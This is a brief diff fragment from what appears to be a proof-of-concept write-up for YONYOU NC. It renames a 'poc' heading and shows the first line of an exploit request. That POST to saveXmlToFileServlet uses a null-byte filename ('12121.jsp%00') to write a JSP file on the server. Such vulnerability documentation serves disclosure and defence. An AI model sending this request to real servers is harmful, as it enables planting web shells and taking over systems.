@@ -9,7 +9,7 @@ title:"YONYOU NC"
 ```
 
 
-## poc
+## POC
 ```
 POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=12121.jsp%00 HTTP/1.1
 Host: 
